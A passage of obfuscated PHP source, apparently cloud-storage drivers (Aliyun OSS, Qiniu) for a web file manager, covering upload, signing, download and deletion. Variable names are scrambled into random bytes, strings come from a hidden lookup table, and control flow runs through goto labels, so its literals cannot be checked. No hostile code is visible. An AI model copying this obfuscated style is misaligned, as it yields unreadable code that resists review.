empty($Eˆ¡Í¥­“) ? $fÉ¦í ŞÊ[1267] : $Eˆ¡Í¥­“; $e„¡ˆ×Òµ = array($fÉ¦í ŞÊ[34], $fÉ¦í ŞÊ[191], $fÉ¦í ŞÊ[1266], $fÉ¦í ŞÊ[1267]); if (!in_array($FœÜ˜¿±”Æ, $e„¡ˆ×Òµ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($D“µ¥’™ ), $FœÜ˜¿±”Æ); } catch (OSS\Core\OssException $E¶ó‰¼—ÇÂ) { return !1; } return !0; } public function getContent($B¢ÑÈÆò¥) { return $this->fileSubstr($B¢ÑÈÆò¥, -1); } public function setContent($cÆãàê¾ŠÒ, $e‹ò”¬¾î´ = '') { $EĞä¡ŒÒ…ä =& $_SERVER[ÉóçÄÇ]; try { $bäø¡ºƒ†Ï = $this->trafficLimit($EĞä¡ŒÒ…ä[1268]); $DóÀ„Îƒ¸ = $this->client->putObject($this->bucket, $this->pathEncode($cÆãàê¾ŠÒ), $e‹ò”¬¾î´, $bäø¡ºƒ†Ï); } catch (OSS\Core\OssException $aí‚¼ÖğÜê) { return !1; } $Fõ¨ŒÅ¹ã« = array($EĞä¡ŒÒ…ä[1257] => trim($DóÀ„Îƒ¸[$EĞä¡ŒÒ…ä[1269]], $EĞä¡ŒÒ…ä[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($cÆãàê¾ŠÒ))); $this->updateObjMeta($cÆãàê¾ŠÒ, $Fõ¨ŒÅ¹ã«); return isset($DóÀ„Îƒ¸[$EĞä¡ŒÒ…ä[1270]][$EĞä¡ŒÒ…ä[1216]]) ? !0 : !1; } private function updateObjMeta($EÕëŸŞÊáí, $d™‰¯Â‹»¯) { $EÕëŸŞÊáí = $this->pathEncode($EÕëŸŞÊáí); try { $bö¹ãï…æÒ = array(OSS\OssClient::OSS_HEADERS => $d™‰¯Â‹»¯); $this->client->copyObject($this->bucket, $EÕëŸŞÊáí, $this->bucket, $EÕëŸŞÊáí, $bö¹ãï…æÒ); } catch (OSS\Core\OssException $A¿ÓÉ£¯®²) { return !1; } return !0; } public function upload($döô¨ßË¿, $BˆïƒÓª¶, $dÜ×ÓÌ†‹Ğ = false, $eñ¥ÔõÙˆã = REPEAT_REPLACE) { $a§‚£×ÛÆ =& $_SERVER[ÉóçÄÇ]; $aÁ±«õì·¿ = trim($döô¨ßË¿, $a§‚£×ÛÆ[8]); $a‚Ã°°¦‰» = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($a§‚£×ÛÆ[1257] => @md5_file($BˆïƒÓª¶)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($döô¨ßË¿))); $a‚Ã°°¦‰» = $this->trafficLimit($a§‚£×ÛÆ[1268], $a‚Ã°°¦‰»); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($aÁ±«õì·¿), $BˆïƒÓª¶, $a‚Ã°°¦‰»); } catch (OSS\Core\OssException $bšÃÀÃ”¹¶) { return !1; } return $this->getPathOuter($döô¨ßË¿); } public function getHost() { $cÑÓ…ø¬ˆ¡ =& $_SERVER[ÉóçÄÇ]; $fÇ¦Ñ¦×°î = explode($cÑÓ…ø¬ˆ¡[177], parent::getHost()); return $fÇ¦Ñ¦×°î[0] . $cÑÓ…ø¬ˆ¡[177] . $this->bucket . $cÑÓ…ø¬ˆ¡[94] . $fÇ¦Ñ¦×°î[1]; } public function uploadFormData($FÃÑİ‘è, $eÁ†™‡ÅùÍ = 3600) { goto cïçñÒ”Ù×; EßÖÖç§è: return $BñÏšÈê´§; goto fßÍ·÷®; f„ƒ˜ãÇöˆ: $C»Î£‡Œã× = base64_encode(hash_hmac($cğ¥ï×ÁÈ³[228], $d¯‰·éÉ’, $this->secret, !0)); $BñÏšÈê´§ = array($cğ¥ï×ÁÈ³[1181] => $d¯‰·éÉ’, $cğ¥ï×ÁÈ³[1274] => $this->accessKey, $cğ¥ï×ÁÈ³[1177] => $cğ¥ï×ÁÈ³[1169], $cğ¥ï×ÁÈ³[1275] => $C»Î£‡Œã×, $cğ¥ï×ÁÈ³[175] => $e¯Æâ¤ƒ); $BñÏšÈê´§ = $this->trafficLimit($cğ¥ï×ÁÈ³[1268], $BñÏšÈê´§); goto EßÖÖç§è; eÅ¥š¥·ÈÓ: $C‘­·¥à« = date($cğ¥ï×ÁÈ³[1271], time() + $DÇ‘Õõ”×È); $C¾İˆÂà¬ƒ = new DateTime($C‘­·¥à«); $eÎšÁ¯¥ = $C¾İˆÂà¬ƒ->format(DateTime::ISO8601); goto bµ‘ËŸ‹„À; bµ‘ËŸ‹„À: $e¬”ÛÜÛœ = strpos($eÎšÁ¯¥, $cğ¥ï×ÁÈ³[292]); $eÎšÁ¯¥ = substr($eÎšÁ¯¥, 0, $e¬”ÛÜÛœ) . $cğ¥ï×ÁÈ³[1272]; $E¤©›»ºã = 1048576000 * 5; goto aö³æ„ƒì; cïçñÒ”Ù×: $cğ¥ï×ÁÈ³ =& $_SERVER[ÉóçÄÇ]; if (!($e¯Æâ¤ƒ = $this->getHost())) { return !1; } $DÇ‘Õõ”×È = $eÁ†™‡ÅùÍ; goto eÅ¥š¥·ÈÓ; aö³æ„ƒì: $d‚öçÛ„ïº = $this->pathFather($FÃÑİ‘è); $Dóñ„Á¡ = array($cğ¥ï×ÁÈ³[1171] => $eÎšÁ¯¥, $cğ¥ï×ÁÈ³[1172] => array(array($cğ¥ï×ÁÈ³[1273], 0, $E¤©›»ºã), array($cğ¥ï×ÁÈ³[1175], $cğ¥ï×ÁÈ³[1176], $d‚öçÛ„ïº))); $d¯‰·éÉ’ = base64_encode(json_encode($Dóñ„Á¡)); goto f„ƒ˜ãÇöˆ; fßÍ·÷®: } public function multiUploadFormData($Aœ—Æ¦Ï´š, $A¯¡õñ„Õ = 3600) { $Cº¤æ„õµ˜ =& $_SERVER[ÉóçÄÇ]; if (!($e¹²„¥›»¸ = $this->getHost())) { return !1; } $Cé„Éåô¤ = $this->trafficLimit($Cº¤æ„õµ˜[1268]); $aî °²Ì–œ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Aœ—Æ¦Ï´š), $Cé„Éåô¤); return array($Cº¤æ„õµ˜[219] => $aî °²Ì–œ, $Cº¤æ„õµ˜[175] => $e¹²„¥›»¸ . $Cº¤æ„õµ˜[8] . $this->pathEncode($Aœ—Æ¦Ï´š), $Cº¤æ„õµ˜[220] => gmdate($Cº¤æ„õµ˜[1276]), $Cº¤æ„õµ˜[92] => $Aœ—Æ¦Ï´š); } public function multiUploadAuthData($EÓƒÈğêËÄ, $B´«¹¬ÖÆÌ = array()) { goto bõ¤°ÂÜë; FĞ¸¯±Üè²: $C¿²¢ñºŞÖ = $EÜçùã…ç[1241] . $this->accessKey . $EÜçùã…ç[4] . $Eˆ‰¦ÀÄ¥; if (strpos($eÂ˜àš¯¥Ã, $EÜçùã…ç[223]) === 0) { $C¿²¢ñºŞÖ = array($EÜçùã…ç[230] => $C¿²¢ñºŞÖ, $EÜçùã…ç[220] => $cİ©ŠÆ‚ÒÓ); if ($D‘ØïŞ…«õ) { $C¿²¢ñºŞÖ = array_merge($C¿²¢ñºŞÖ, $D‘ØïŞ…«õ); } } return $C¿²¢ñºŞÖ; goto C†•Õ‚´øÛ; aìˆ…‡å·›: $AàÉØù— = array($EÜçùã…ç[222], $EÜçùã…ç[33], $EÜçùã…ç[118], $cİ©ŠÆ‚ÒÓ, "\x78\55\157\163\163\x2d\144\141\164\145\x3a{$cİ©ŠÆ‚ÒÓ}", $EÜçùã…ç[8] . $this->bucket . $EÜçùã…ç[8] . $F÷¬¸ƒ…ß . $eÂ˜àš¯¥Ã); if (strpos($eÂ˜àš¯¥Ã, $EÜçùã…ç[223]) === 0) { $AàÉØù—[0] = $EÜçùã…ç[224]; if ($D‘ØïŞ…«õ = $this->trafficLimit($EÜçùã…ç[1268])) { $F÷¬¸ƒ…ß = $EÜçùã…ç[1277]; array_splice($AàÉØù—, 5, 0, $F÷¬¸ƒ…ß . $EÜçùã…ç[4] . $D‘ØïŞ…«õ[$F÷¬¸ƒ…ß]); } } if (isset($B´«¹¬ÖÆÌ[$EÜçùã…ç[225]]) && $B´«¹¬ÖÆÌ[$EÜçùã…ç[225]] == $EÜçùã…ç[226]) { $AàÉØù—[0] = $EÜçùã…ç[226]; } goto a˜¨‡çËÙ; bõ¤°ÂÜë: $EÜçùã…ç =& $_SERVER[ÉóçÄÇ]; $cİ©ŠÆ‚ÒÓ = isset($B´«¹¬ÖÆÌ[$EÜçùã…ç[220]]) ? $B´«¹¬ÖÆÌ[$EÜçùã…ç[220]] : gmdate($EÜçùã…ç[1276]); $eÂ˜àš¯¥Ã = isset($B´«¹¬ÖÆÌ[$EÜçùã…ç[167]]) ? $B´«¹¬ÖÆÌ[$EÜçùã…ç[167]] : $EÜçùã…ç[33]; goto aÒ‹Ô¼Ğ¦Ï; a˜¨‡çËÙ: if (!empty($B´«¹¬ÖÆÌ[$EÜçùã…ç[1278]])) { $bâó…å®¢â = array_merge(array($AàÉØù—[4]), $B´«¹¬ÖÆÌ[$EÜçùã…ç[1278]]); sort($bâó…å®¢â); $AàÉØù—[4] = implode($EÜçùã…ç[227], $bâó…å®¢â); } $d†±˜ªÔæÔ = implode($EÜçùã…ç[227], $AàÉØù—); $Eˆ‰¦ÀÄ¥ = base64_encode(hash_hmac($EÜçùã…ç[228], $d†±˜ªÔæÔ, $this->secret, !0)); goto FĞ¸¯±Üè²; aÒ‹Ô¼Ğ¦Ï: $F÷¬¸ƒ…ß = $EÓƒÈğêËÄ; if (isset($B´«¹¬ÖÆÌ[$EÜçùã…ç[92]])) { $F÷¬¸ƒ…ß = $B´«¹¬ÖÆÌ[$EÜçùã…ç[92]]; unset($B´«¹¬ÖÆÌ[$EÜçùã…ç[92]]); } if (isset($B´«¹¬ÖÆÌ[$EÜçùã…ç[221]])) { $B´«¹¬ÖÆÌ[$EÜçùã…ç[220]] = $cİ©ŠÆ‚ÒÓ; return $this->listUploadParts($F÷¬¸ƒ…ß, $B´«¹¬ÖÆÌ); } goto aìˆ…‡å·›; C†•Õ‚´øÛ: } public function listUploadParts($d‘©²÷œ×Ÿ, $BŸ‡®à£˜Ó) { goto A›ŸŒã¾¶À; cÛ¿ÚÚÛÎá: return array($eöÙË¯®Ö—[230] => $d‹î¥…ƒ°¥, $eöÙË¯®Ö—[220] => $BŸ‡®à£˜Ó[$eöÙË¯®Ö—[220]], $eöÙË¯®Ö—[232] => $F’á¯­µ–ƒ); goto E…‘Š‘ÆÍÀ; Cİà°Áßî¸: $BÒ±ÕöˆŠÒ = $AîíĞÌá‘Ò->getListPart(); $F’á¯­µ–ƒ = array(); foreach ($BÒ±ÕöˆŠÒ as $FÊ²ºãïÚœ) { $F’á¯­µ–ƒ[] = array($eöÙË¯®Ö—[1261] => $FÊ²ºãïÚœ->getPartNumber(), $eöÙË¯®Ö—[1262] => trim($FÊ²ºãïÚœ->getETag(), $eöÙË¯®Ö—[115])); } goto a¢Ô½Ê¬‘í; A›ŸŒã¾¶À: $eöÙË¯®Ö— =& $_SERVER[ÉóçÄÇ]; $e„‰¡ñ¶Æ½ = parse_url_query($BŸ‡®à£˜Ó[$eöÙË¯®Ö—[167]]); $AîíĞÌá‘Ò = $this->client->listParts($this->bucket, $this->pathEncode($d‘©²÷œ×Ÿ), $e„‰¡ñ¶Æ½[$eöÙË¯®Ö—[219]]); goto Cİà°Áßî¸; a¢Ô½Ê¬‘í: unset($BŸ‡®à£˜Ó[$eöÙË¯®Ö—[221]], $BŸ‡®à£˜Ó[$eöÙË¯®Ö—[225]]); $d‹î¥…ƒ°¥ = $this->multiUploadAuthData($d‘©²÷œ×Ÿ, $BŸ‡®à£˜Ó); if (empty($d‹î¥…ƒ°¥)) { return !1; } goto cÛ¿ÚÚÛÎá; E…‘Š‘ÆÍÀ: } public function download($eÒßÂÎ †‹, $cºÈœÂòƒ¸) { if ($this->isFolder($eÒßÂÎ †‹)) { return !1; } try { $c İ¥‰ïƒÅ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $cºÈœÂòƒ¸); $c İ¥‰ïƒÅ = $this->trafficLimit($_SERVER[ÉóçÄÇ][108], $c İ¥‰ïƒÅ); $this->client->getObject($this->bucket, $this->pathEncode($eÒßÂÎ †‹), $c İ¥‰ïƒÅ); } catch (OSS\Core\OssException $E¨ƒô‹ì ) { return !1; } return $cºÈœÂòƒ¸; } public function fileSubstr($Fá Ìâë¥ , $D„­µàÔÉç = 0, $c™Ë¨…Œ¬ = false) { if ($D„­µàÔÉç === -1) { $a‘˜Ù‚‡àª = array(); } else { if ($c™Ë¨…Œ¬ === !1) { $FšâğÄÚË‰ = $this->size($Fá Ìâë¥ ); } else { $FšâğÄÚË‰ = $D„­µàÔÉç + $c™Ë¨…Œ¬ - 1; } $a‘˜Ù‚‡àª = array(OSS\OssClient::OSS_RANGE => "{$D„­µàÔÉç}\55{$FšâğÄÚË‰}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Fá Ìâë¥ ), $a‘˜Ù‚‡àª); } catch (OSS\Core\OssException $bƒò«ñ‡¬Ô) { think_exception($bƒò«ñ‡¬Ô->getMessage()); return !1; } } private function trafficLimit($E‘ô®Û²Úø, $eğ³ë™Ù = array()) { goto D¸´¦´½ÜÅ; e¿ö†Š†å„: if (!$a©ßÒ–‹ÆÒ) { return $eğ³ë™Ù; } $a©ßÒ–‹ÆÒ = $a©ßÒ–‹ÆÒ < 819200 ? 819200 : ($a©ßÒ–‹ÆÒ > 838860800 ? 838860800 : $a©ßÒ–‹ÆÒ); $eğ³ë™Ù[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($a©ßÒ–‹ÆÒ); goto d¯ª“ŠÌÓ; D¸´¦´½ÜÅ: $FğÉ‹ˆÌÚË =& $_SERVER[ÉóçÄÇ]; if ($E‘ô®Û²Úø == $FğÉ‹ˆÌÚË[1268] && $this->isUploadServer() || $E‘ô®Û²Úø == $FğÉ‹ˆÌÚË[108] && $this->isFileOutServer()) { return $eğ³ë™Ù; } $a©ßÒ–‹ÆÒ = floatval($GLOBALS[$FğÉ‹ˆÌÚË[6]][$FğÉ‹ˆÌÚË[87]][$FğÉ‹ˆÌÚË[106]][$E‘ô®Û²Úø]) * 1024 * 1024 * 8; goto e¿ö†Š†å„; d¯ª“ŠÌÓ: return $eğ³ë™Ù; goto F§÷ô´àÇ; F§÷ô´àÇ: } public function link($fÙ²¯îœ¡Ğ, $D¶“‡ºîÈ‰ = array()) { $FóÓÀÖ÷—Æ =& $_SERVER[ÉóçÄÇ]; if (!$this->exist($fÙ²¯îœ¡Ğ) || $this->isFolder($fÙ²¯îœ¡Ğ)) { return !1; } try { $D¶“‡ºîÈ‰ = $this->trafficLimit($FóÓÀÖ÷—Æ[108], $D¶“‡ºîÈ‰); $B•“âéÂ² = $this->client->signUrl($this->bucket, $this->pathEncode($fÙ²¯îœ¡Ğ), 3600 * 12, $FóÓÀÖ÷—Æ[226], $D¶“‡ºîÈ‰); return $this->getCdnLink($B•“âéÂ²); } catch (OSS\Core\OssException $F‡†¿â£®à) { return !1; } } public function fileOut($aôÁ¾·ã…Ù, $f®æ¶ÈßÂ = false, $cãÎ÷­®À‚ = false, $F¬®Ü´•ÊÍ = '') { goto aêô°©Ø; dá«ÇÎ¾±: $cãÎ÷­®À‚ = rawurlencode($cãÎ÷­®À‚); $F²•ÓÖ³²¢ = get_file_mime(get_path_ext($cãÎ÷­®À‚)); if ($F²•ÓÖ³²¢ == $AÏ©÷”šÂá[211]) { return parent::fileOut($aôÁ¾·ã…Ù, $f®æ¶ÈßÂ, $cãÎ÷­®À‚, $F¬®Ü´•ÊÍ); } goto e¨ëİå³µ‚; f–°æ§ÒØ: $B¯ÔÌ­±¹ = $this->link($aôÁ¾·ã…Ù, $eßÏŒ¢Æ®); $this->fileOutLink($B¯ÔÌ­±¹); goto c«ˆè½è¾ö; aêô°©Ø: $AÏ©÷”šÂá =& $_SERVER[ÉóçÄÇ]; if ($this->isFileOutServer()) { return $this->fileOutServer($aôÁ¾·ã…Ù, $f®æ¶ÈßÂ, $cãÎ÷­®À‚, $F¬®Ü´•ÊÍ); } if (!$cãÎ÷­®À‚) { $cãÎ÷­®À‚ = $this->pathThis($aôÁ¾·ã…Ù); } goto dá«ÇÎ¾±; e¨ëİå³µ‚: $f®æ¶ÈßÂ = $f®æ¶ÈßÂ ? $AÏ©÷”šÂá[212] : $AÏ©÷”šÂá[213]; $eßÏŒ¢Æ® = array(OSS\OssClient::OSS_SUB_RESOURCE => $AÏ©÷”šÂá[1279] . rawurlencode("{$f®æ¶ÈßÂ}\73\x66\x69\x6c\x65\156\x61\x6d\145\x3d{$cãÎ÷­®À‚}")); $eßÏŒ¢Æ®[OSS\OssClient::OSS_SUB_RESOURCE] .= $AÏ©÷”šÂá[1280] . rawurlencode($F²•ÓÖ³²¢); goto f–°æ§ÒØ; c«ˆè½è¾ö: } public function fileOutServer($D¤Ä›õ®³Ö, $D»·¡Şù„ = false, $a±òæ¹Ûº  = false, $cÌõùæõ‡Ú = '') { parent::fileOut($D¤Ä›õ®³Ö, $D»·¡Şù„, $a±òæ¹Ûº , $cÌõùæõ‡Ú); } public function fileOutImage($A„²İç¡‹, $AÌÈÆ¼ïó… = 250) { $D®š´ƒ• = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ÉóçÄÇ][1281] . $AÌÈÆ¼ïó…); $cõèœãŠÅì = $this->link($A„²İç¡‹, $D®š´ƒ•); $this->fileOutLink($cõèœãŠÅì); } public function fileOutImageServer($EÑô…½‡–, $DÍÏ“‹°ùƒ = 250) { parent::fileOutImage($EÑô…½‡–, $DÍÏ“‹°ùƒ); } public function fileOutLink($aö‹‰ôÏÃ˜) { $E¾…ñù«çß =& $_SERVER[ÉóçÄÇ]; if (!$this->isCdnHost() && substr($aö‹‰ôÏÃ˜, 0, 7) == $E¾…ñù«çß[1184]) { $aö‹‰ôÏÃ˜ = $E¾…ñù«çß[1185] . substr($aö‹‰ôÏÃ˜, 7); } header($E¾…ñù«çß[158] . $aö‹‰ôÏÃ˜); die; } public function hashMd5($AÚ¶­«…Ÿ­, $C±îß«–è² = '') { $b®ù™¥·îö =& $_SERVER[ÉóçÄÇ]; $AÃÄÉ‡ÑÊî = $this->_objectMeta($AÚ¶­«…Ÿ­); if (!$AÃÄÉ‡ÑÊî) { return $b®ù™¥·îö[33]; } if (!isset($AÃÄÉ‡ÑÊî[$b®ù™¥·îö[1257]]) && !empty($C±îß«–è²)) { $BæßİÆË±– = $this->updateObjMeta($AÚ¶­«…Ÿ­, array($b®ù™¥·îö[1257] => $C±îß«–è²)); $AÃÄÉ‡ÑÊî[$b®ù™¥·îö[1257]] = $BæßİÆË±– ? $C±îß«–è² : $b®ù™¥·îö[33]; } return isset($AÃÄÉ‡ÑÊî[$b®ù™¥·îö[1257]]) ? strtolower($AÃÄÉ‡ÑÊî[$b®ù™¥·îö[1257]]) : $b®ù™¥·îö[33]; } public function size($e¬ÃåÙğ¯‰) { $B°ÓÇªÔ † = $this->objectMeta($e¬ÃåÙğ¯‰); return $B°ÓÇªÔ † ? $B°ÓÇªÔ †[$_SERVER[ÉóçÄÇ][77]] : 0; } public function info($c›™‰ª†ÙÕ) { if ($this->isFolder($c›™‰ª†ÙÕ)) { return $this->folderInfo($c›™‰ª†ÙÕ); } else { if ($this->isFile($c›™‰ª†ÙÕ)) { return $this->fileInfo($c›™‰ª†ÙÕ); } } return !1; } public function exist($F¼ªò¸÷) { return $this->isFile($F¼ªò¸÷) || $this->isFolder($F¼ªò¸÷); } public function isFile($eÔÎŒ£÷ªÃ) { return !$this->isFolder($eÔÎŒ£÷ªÃ) && $this->objectMeta($eÔÎŒ£÷ªÃ); } public function isFolder($eòì¬Í÷›ğ) { return $this->cacheMethod($_SERVER[ÉóçÄÇ][197], $eòì¬Í÷›ğ); } protected function objectMeta($c¹ Ù¹¬Â) { return $this->cacheMethod($_SERVER[ÉóçÄÇ][198], $c¹ Ù¹¬Â); } protected function _objectMeta($cÀÒ¦âÏ†Ñ) { $e²§¡ËØØ¶ =& $_SERVER[ÉóçÄÇ]; try { $d•¡óØ†ÅÏ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($cÀÒ¦âÏ†Ñ)); } catch (OSS\Core\OssException $B³‰¥İİ‚) { $d•¡óØ†ÅÏ = !1; } if ($d•¡óØ†ÅÏ) { $d•¡óØ†ÅÏ[$e²§¡ËØØ¶[77]] = intval($d•¡óØ†ÅÏ[$e²§¡ËØØ¶[1255]]); } return $d•¡óØ†ÅÏ; } protected function _isFolder($C‹ÛØªø•) { $dİ“‡¹‰ãÑ =& $_SERVER[ÉóçÄÇ]; if ($C‹ÛØªø• == $dİ“‡¹‰ãÑ[33] || $C‹ÛØªø• == $dİ“‡¹‰ãÑ[8]) { return !0; } $c›Œøô—å = array($dİ“‡¹‰ãÑ[1251] => $dİ“‡¹‰ãÑ[8], $dİ“‡¹‰ãÑ[1252] => rtrim($C‹ÛØªø•, $dİ“‡¹‰ãÑ[8]) . $dİ“‡¹‰ãÑ[8], $dİ“‡¹‰ãÑ[1253] => 1, $dİ“‡¹‰ãÑ[1254] => $dİ“‡¹‰ãÑ[33]); $fåõáğÍ†š = $this->client->listObjects($this->bucket, $c›Œøô—å); if ($fåõáğÍ†š->getObjectList() || $fåõáğÍ†š->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($A¬°‘¤Ãàù) { parent::__construct(); require_once SDK_DIR . $_SERVER[ÉóçÄÇ][1282]; $this->_init($A¬°‘¤Ãàù); } public function _init($aˆ¸Ú¥‹†) { goto Fˆ±ùÌë§; cÃİÔ‘ñŒ£: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto E§‘Ú¯•; Cğ‘ùÑÓ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto cÃİÔ‘ñŒ£; Fˆ±ùÌë§: $DŒ¨áÊ½£é =& $_SERVER[ÉóçÄÇ]; foreach ($aˆ¸Ú¥‹† as $D·Ì Ôİœ => $c¬äœ÷†ÍÎ) { if (isset($this->{$D·Ì Ôİœ})) { $this->{$D·Ì Ôİœ} = $c¬äœ÷†ÍÎ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($DŒ¨áÊ½£é[1283] . LNG($DŒ¨áÊ½£é[1242])); } goto Cğ‘ùÑÓ; E§‘Ú¯•: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ağƒÇ¥¦œ¨, $A”‹óÜÀ¶ = '', $A„Ôš…¹Ë² = REPEAT_RENAME) { if ($this->setContent($ağƒÇ¥¦œ¨, $A”‹óÜÀ¶)) { return $this->getPathOuter($ağƒÇ¥¦œ¨); } return !1; } public function mkdir($B¾¨Æ»¬é¨, $eÈÈ•¸¶‚’ = REPEAT_SKIP) { goto FËÔô™Ç; dÍ¯¨éÀô: if (!$this->mkfile($E¥ô„¥æÀñ)) { return !1; } if (!$this->moveFile($E¥ô„¥æÀñ, $B¾¨Æ»¬é¨)) { $this->delFile($E¥ô„¥æÀñ); return !1; } return $this->getPathOuter($A¨§Ã‹É‰); goto b‘®£˜ñ¹; F´ÎÏ£×ä: $B¾¨Æ»¬é¨ = $A¨§Ã‹É‰ . $CãÍÄçë”[8]; $e¥æ»ìšˆ• = get_path_this($A¨§Ã‹É‰); $E¥ô„¥æÀñ = $B¾¨Æ»¬é¨ . $e¥æ»ìšˆ•; goto dÍ¯¨éÀô; FËÔô™Ç: $CãÍÄçë” =& $_SERVER[ÉóçÄÇ]; $A¨§Ã‹É‰ = trim($B¾¨Æ»¬é¨, $CãÍÄçë”[8]); if ($this->_isFolder($A¨§Ã‹É‰)) { return $this->getPathOuter($A¨§Ã‹É‰); } goto F´ÎÏ£×ä; b‘®£˜ñ¹: } public function copyFile($Dâ‡š™ò´‰, $d²ÜÂĞé½š) { $Fì×ŒõÅ = $this->bucketManager->copy($this->bucket, $Dâ‡š™ò´‰, $this->bucket, $d²ÜÂĞé½š, !0); return $Fì×ŒõÅ ? !1 : $this->getPathOuter($d²ÜÂĞé½š); } public function moveFile($eË©òäšî, $B³ç®‚¹æù) { $Bªİ‚º¼¨æ = $this->bucketManager->move($this->bucket, $eË©òäšî, $this->bucket, $B³ç®‚¹æù, !0); return $Bªİ‚º¼¨æ ? !1 : $this->getPathOuter($B³ç®‚¹æù); } public function delFile($CìğâÃÁÀ‰) { if (!$this->exist($CìğâÃÁÀ‰)) { return !0; } $fƒæô«ÕÒ = $this->bucketManager->delete($this->bucket, $CìğâÃÁÀ‰); return $fƒæô«ÕÒ ? !1 : !0; } public function delFolder($FÆ´¡Ç¥İª) { goto Bµ›©Ï„Ó; f†Œµº¸Œ®: $cìãÇæÄÅ = $this->fileList($FÆ´¡Ç¥İª); $this->listItemCache = !0; $F˜àÎ·Ô¶Ñ = trim($FÆ´¡Ç¥İª, $AÈ­•Š•Š[8]) . $AÈ­•Š•Š[8]; goto cçå•î¸ºÍ; Bµ›©Ï„Ó: $AÈ­•Š•Š =& $_SERVER[ÉóçÄÇ]; if (!$this->exist($FÆ´¡Ç¥İª)) { return !0; } $this->listItemCache = !1; goto f†Œµº¸Œ®; eĞ›¸¢¥­¾: return $this->delByBatch($cìãÇæÄÅ[$AÈ­•Š•Š[74]]); goto a¹Ğ‡¶Ñ¿ù; cçå•î¸ºÍ: if (!empty($FÆ´¡Ç¥İª) && !in_array($F˜àÎ·Ô¶Ñ, $cìãÇæÄÅ[$AÈ­•Š•Š[74]])) { $cìãÇæÄÅ[$AÈ­•Š•Š[74]][] = $F˜àÎ·Ô¶Ñ; } $AÆøùÈ¢Ÿ = $this->delByBatch($cìãÇæÄÅ[$AÈ­•Š•Š[73]]); if (!$AÆøùÈ¢Ÿ) { return !1; } goto eĞ›¸¢¥­¾; a¹Ğ‡¶Ñ¿ù: } private function delByBatch($e×‚ÃË˜¦) { foreach (array_chunk($e×‚ÃË˜¦, 1000) as $cÖ‘š¨å) { $f‚ŸãÄˆ = $this->bucketManager->buildBatchDelete($this->bucket, $cÖ‘š¨å); list($f´äšá™¯í, $f¼á˜¤¼´£) = $this->bucketManager->batch($f‚ŸãÄˆ); if ($f¼á˜¤¼´£) { return !1; } } return !0; } public function rename($eº¯ªäÉ»ù, $F×“ó©âä‡) { return $this->renameObject($eº¯ªäÉ»ù, $F×“ó©âä‡); } public function fileInfo($f’Çæ£§òÑ, $aö±Åä’¢Õ = false, $dËÆƒèÖ‚¡ = array()) { goto féç Å©Ñè; féç Å©Ñè: $F– Ëß¶ÀÔ =& $_SERVER[ÉóçÄÇ]; $e¨šÖ‰ºø¼ = array($F– Ëß¶ÀÔ[28] => $this->pathThis($f’Çæ£§òÑ), $F– Ëß¶ÀÔ[75] => $this->getPathOuter($F– Ëß¶ÀÔ[8] . $f’Çæ£§òÑ), $F– Ëß¶ÀÔ[29] => $F– Ëß¶ÀÔ[173], $F– Ëß¶ÀÔ[77] => isset($dËÆƒèÖ‚¡[$F– Ëß¶ÀÔ[1284]]) ? $dËÆƒèÖ‚¡[$F– Ëß¶ÀÔ[1284]] : 0, $F– Ëß¶ÀÔ[167] => $this->ext($f’Çæ£§òÑ)); if ($aö±Åä’¢Õ) { return $e¨šÖ‰ºø¼; } goto eÖêù¬ÒÎª; aÌÂÔ÷¶–: if (isset($dËÆƒèÖ‚¡[$F– Ëß¶ÀÔ[1285]])) { $e¨šÖ‰ºø¼[$F– Ëß¶ÀÔ[83]] = substr($dËÆƒèÖ‚¡[$F– Ëß¶ÀÔ[1285]] . $F– Ëß¶ÀÔ[33], 0, 10); } if (isset($dËÆƒèÖ‚¡[$F– Ëß¶ÀÔ[1284]])) { $e¨šÖ‰ºø¼[$F– Ëß¶ÀÔ[77]] = $dËÆƒèÖ‚¡[$F– Ëß¶ÀÔ[1284]]; } return $e¨šÖ‰ºø¼; goto b…³«ÎÛì«; eÖêù¬ÒÎª: $e¨šÖ‰ºø¼[$F– Ëß¶ÀÔ[192]] = $e¨šÖ‰ºø¼[$F– Ëß¶ÀÔ[83]] = 0; $e¨šÖ‰ºø¼[$F– Ëß¶ÀÔ[193]] = $e¨šÖ‰ºø¼[$F– Ëß¶ÀÔ[194]] = !0; if (empty($dËÆƒèÖ‚¡)) { $dËÆƒèÖ‚¡ = $this->objectMeta($f’Çæ£§òÑ); if (!$dËÆƒèÖ‚¡) { return $e¨šÖ‰ºø¼; } } goto aÌÂÔ÷¶–; b…³«ÎÛì«: } public function folderInfo($F—¤Û“ÀÈÒ, $bªè‡˜åª‚ = false) { goto Eíªê Àª; Eíªê Àª: $BÔ°Üìñà =& $_SERVER[ÉóçÄÇ]; $eƒ‘ù„š±ˆ = array($BÔ°Üìñà[28] => $this->pathThis($F—¤Û“ÀÈÒ), $BÔ°Üìñà[75] => $this->getPathOuter($BÔ°Üìñà[8] . $F—¤Û“ÀÈÒ), $BÔ°Üìñà[29] => $BÔ°Üìñà[76]); if ($bªè‡˜åª‚) { return $eƒ‘ù„š±ˆ; } goto A×¸Öè£Ï¾; A×¸Öè£Ï¾: $eƒ‘ù„š±ˆ[$BÔ°Üìñà[192]] = 